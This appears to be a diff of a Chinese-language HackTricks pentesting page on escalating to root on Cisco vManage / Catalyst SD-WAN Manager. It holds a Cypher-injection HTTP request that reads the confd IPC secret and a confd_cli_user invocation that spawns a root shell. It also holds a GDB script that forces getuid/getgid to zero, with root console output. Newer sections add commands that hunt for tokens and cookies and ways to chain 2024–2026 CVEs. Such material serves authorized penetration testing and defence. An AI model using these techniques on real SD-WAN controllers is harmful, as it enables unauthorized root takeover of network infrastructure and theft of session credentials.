@@ -2,17 +2,33 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 路径 1
+一旦你在 Cisco vManage / *Catalyst SD-WAN Manager* 上以 `vmanage`、`netadmin` 或 `vmanage-admin` 获得 code execution，最有意思的本地 privesc 入口通常是 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs，以及 root-owned 的 import/upload handlers。
 
-(示例来自 [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+如果你仍然需要在 controller 上获得 **initial foothold**，先查看专门的 control-plane 页面：
 
-在查看了一些与 `confd` 和不同二进制文件相关的 [documentation](http://66.218.245.39/doc/html/rn03re18.html)（可通过 Cisco 网站的账户访问）之后，我们发现为了对 IPC socket 进行认证，它使用了位于 `/etc/confd/confd_ipc_secret` 的一个 secret：
+{{#ref}}
+../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
+{{#endref}}
+
+## Quick local triage
+```bash
+ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
+ss -lntp | egrep '4565|830'
+ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
+```
+如果 `/etc/confd/confd_ipc_secret` 可从你的 foothold 读取，Path 1 和 Path 2 会立刻变得可行。
+
+## Path 1
+
+(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+
+After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` 和不同的 binaries（可通过 Cisco 网站上的账号访问），我们发现，为了对 IPC socket 进行 authentication，它使用了一个位于 `/etc/confd/confd_ipc_secret` 的 secret：
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-还记得我们的 Neo4j 实例吗？它在 `vmanage` 用户权限下运行，因此允许我们利用之前的漏洞检索该文件：
+还记得我们的 Neo4j 实例吗？它是在 `vmanage` 用户的权限下运行的，因此我们可以利用之前的漏洞来检索该文件：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -24,7 +40,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli` 程序不支持命令行参数，但会以参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接用自己的参数调用 `/usr/bin/confd_cli_user`。然而以当前权限无法读取它，所以必须从 rootfs 中取出并用 scp 复制，查看帮助，然后用它获取 shell：
+`confd_cli` 程序不支持命令行参数，但会带参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接用自己的一组参数来调用 `/usr/bin/confd_cli_user`。不过，当前权限下它不可读，所以我们必须从 rootfs 中把它取出来并使用 scp 复制，然后查看 help，并用它来获取 shell：
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -42,16 +58,16 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## 路径 2
+## Path 2
 
-(示例来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77) 的示例)
 
-该由 synacktiv 团队撰写的博客¹ 描述了一种获得 root shell 的优雅方法，但缺点是它需要获取 `/usr/bin/confd_cli_user` 的副本，而该文件只有 root 可读。我找到了另一种无需此麻烦即可提权到 root 的方法。
+synacktiv 团队的 blog¹ 描述了一种优雅地获取 root shell 的方法，但问题是它需要拿到 `/usr/bin/confd_cli_user` 的副本，而该文件只有 root 可读。我找到了另一种无需这种麻烦就能提权到 root 的方法。
 
-当我反汇编 `/usr/bin/confd_cli` 二进制文件时，我观察到如下：
+当我反汇编 `/usr/bin/confd_cli` binary 时，我观察到如下内容：
 
 <details>
-<summary>Objdump 显示 UID/GID 收集</summary>
+<summary>显示 UID/GID 收集的 Objdump</summary>
 ```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -82,20 +98,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 </details>
 
-当我运行 “ps aux”, 我观察到以下内容 (_注意 -g 100 -u 107_)
+当我运行“ps aux”时，我观察到以下内容（_注意 -g 100 -u 107_）
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-我推测 “confd_cli” 程序会把从已登录用户收集到的用户 ID 和组 ID 传给 “cmdptywrapper” 应用。
+我假设 “confd_cli” 程序会将它从已登录用户收集到的 user ID 和 group ID 传递给 “cmdptywrapper” 应用程序。
 
-我最初的尝试是直接运行 “cmdptywrapper” 并传入 `-g 0 -u 0`，但失败了。看来在某处创建了一个文件描述符（-i 1015），我无法伪造它。
+我的第一次尝试是直接运行 “cmdptywrapper” 并向它提供 `-g 0 -u 0`，但失败了。看起来在过程中某处创建了一个 file descriptor（-i 1015），而我无法伪造它。
 
-正如 synacktiv’s blog（最后一个示例）中提到的，`confd_cli` 程序不支持命令行参数，但我可以用调试器影响它，幸运的是系统中包含了 GDB。
+正如 synacktiv 的博客（最后一个示例）中提到的，`confd_cli` 程序不支持 command line argument，但我可以用 debugger 影响它，幸运的是系统里包含 GDB。
 
-我创建了一个 GDB 脚本，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 拥有 “vmanage” 权限，我可以直接读取 `/etc/confd/confd_ipc_secret`。
+我创建了一个 GDB 脚本，在其中强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 获得了 “vmanage” privilege，因此我有权限直接读取 `/etc/confd/confd_ipc_secret`。
 
 root.gdb:
 ```
@@ -115,8 +131,6 @@ root
 end
 run
 ```
-控制台输出:
-
 <details>
 <summary>控制台输出</summary>
 ```text
@@ -154,23 +168,66 @@ bash-4.4#
 ```
 </details>
 
-## 路径 3 (2025 CLI input validation bug)
+## 路径 3（2025 CLI input validation bug - CVE-2025-20122）
 
-Cisco 把 vManage 重命名为 *Catalyst SD-WAN Manager*，但底层的 CLI 仍然在同一台机器上运行。一个 2025 年的咨询 (CVE-2025-20122) 描述了 CLI 中的输入验证不足，允许 **any authenticated local user** 通过向 manager CLI 服务发送精心构造的请求来获得 root。将任何 low-priv foothold（例如来自 Path1 的 Neo4j deserialization，或一个 cron/backup user shell）与此缺陷结合，即可在不复制 `confd_cli_user` 或附加 GDB 的情况下直接提权到 root：
+Cisco 后来在其关于 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) 的公告中记录了一个更简洁的本地 root 路径：一个**仅具备只读权限的已认证攻击者**可以向 manager CLI 发送精心构造的请求，并由于输入验证不足而跳到 root。
 
-1. 使用你的 low-priv shell 定位 CLI 的 IPC 端点（通常是 Path2 中在端口 4565 上显示的 `cmdptywrapper` listener）。
-2. 构造一个 CLI 请求，将 UID/GID 字段伪造为 0。验证漏洞未能强制使用原始调用者的 UID，因此 wrapper 会启动一个以 root 支持的 PTY。
-3. 将任意命令序列（`vshell; id`）通过伪造的请求管道传入以获取 root shell。
+从 offensive 角度看，关键 takeaway 是：
 
-> 利用面仅限本地；remote code execution 仍然是获得初始 shell 的前提，但一旦进入机器，利用只需发送一条 IPC 消息，而不是通过 debugger-based UID patch。
+1. 一旦你在主机上拿到任何 *low-priv* foothold，就应该在走更重的 Path 1 / Path 2 workflow 之前先测试本地 CLI service。
+2. 复用 Path 2 的 artifacts 来找到 trust boundary：`confd_cli` → `cmdptywrapper` → `vshell`。
+3. 将转发到 CLI backend 的每个字段都视为可疑：UID/GID、username、terminal metadata、imported files，或之后由 root-owned helper 消费的任何值。
+4. 如果 low-priv 用户能够接触本地 CLI socket 并影响这些字段，那么 root 可能只差一条精心构造的请求。
+
+在落地到 appliance 之后，一个实用的 workflow 是：
+```bash
+strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
+strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
+ss -lntp | grep 4565
+```
+这会把 2025 的 bug 变成一个很好的 hunting 模式，用于类似版本：寻找 **在 userland 中收集身份并将其转发给更高权限 wrapper 的本地 CLI shim**。
+
+## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)
+
+Cisco 的 2026 年 2 月 advisory 还引入了另一个有用的 privesc 类别： [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) 允许一个 **已认证、低权限的本地 attacker** 因 REST API 中用户认证机制不足而获得 root。
+
+这很重要，因为 vManage privesc 不再只限于 `confd`/TTY abuse 了。拿到低权限 shell 后，也要继续 hunting：
+
+- 只允许 localhost 的 API endpoints，但过于信任调用者
+- 当前账户可读的 tokens、cookies 或 service credentials
+- 通过 `dataservice`/REST handlers 暴露出来、但仍可在本地触发的 root-only actions
+
+在实践中，一旦你获得了 `vmanage` 或其他 service user 的 shell，本地 API abuse 往往比交互式 CLI abuse 更安静，也更容易自动化：
+```bash
+env | grep -iE 'token|cookie|session'
+grep -R "dataservice" /etc /opt 2>/dev/null | head
+ss -lntp | grep -E '(:443|:8443)'
+```
+如果本地 session 上下文足以调用特权 REST 功能，优先使用 API 路径：它更容易重放、编写脚本，并与被盗的 web sessions 或 API tokens 进行链式利用。
+
+## Path 5（2026 年由 root 处理的 crafted file - CVE-2026-20245）
+
+另一个最近的模式是 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)：具有 `netadmin` 权限的本地攻击者可以上传一个 **crafted file**，之后 CLI 会不安全地处理它，导致以 `root` 身份发生 command injection。
+
+从 HackTricks 的角度看，这个有价值的 technique 比特定 CVE 更宽泛：
+
+1. 枚举所有接受文件的 CLI 或 web workflow：imports、diagnostic bundles、templates、validators、backups、tenant data 等。
+2. 追踪上传的文件落到哪里，以及哪个 root-owned script 或 binary 会消费它。
+3. 测试 filename、file content 或解析后的 metadata 是否会被传递给 shell commands、wrapper scripts，或 `system()` 风格的 helpers。
+4. 如果你已经能拿到 `netadmin`（有效凭据、被盗 session，或 auth-bypass 链），file-processing bugs 往往是最快到 root 的路径。
+
+这类 bug 尤其适合与授予 `netadmin` 但不给 `root` 的远程 foothold 进行链式利用。
 
 ## 其他近期可用于链式利用的 vManage/Catalyst SD-WAN Manager 漏洞
 
-* **Authenticated UI XSS (CVE-2024-20475)** – 在特定界面字段注入 JavaScript；窃取 admin session 会给你一条通过浏览器驱动的路径到 `vshell` → local shell → Path3 获取 root。
+- **Authenticated UI XSS (CVE-2024-20475)** – 在 web UI 中窃取 admin session，然后转向 API/CLI actions，最终到达 `vshell` 或上面的某个 local privesc 路径。
+- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 对 Path 5 来说是非常强的前置条件，因为 `netadmin` 正是 2026 crafted-file privesc 所需的权限级别。
+- **Authenticated arbitrary file write (CVE-2026-20262)** – 适合投放后续会被特权组件解析的文件，或覆盖由 root-owned helpers 消费的 operational artifacts。
+- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 在专门的 SD-WAN control-plane 页面里有更详细说明；它可以为 `vmanage-admin` 追加 SSH key，从而给你所需的本地 foothold 以回到本页内容。
 
 ## References
 
-- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
-- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
+- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
 
 {{#include ../../banners/hacktricks-training.md}}
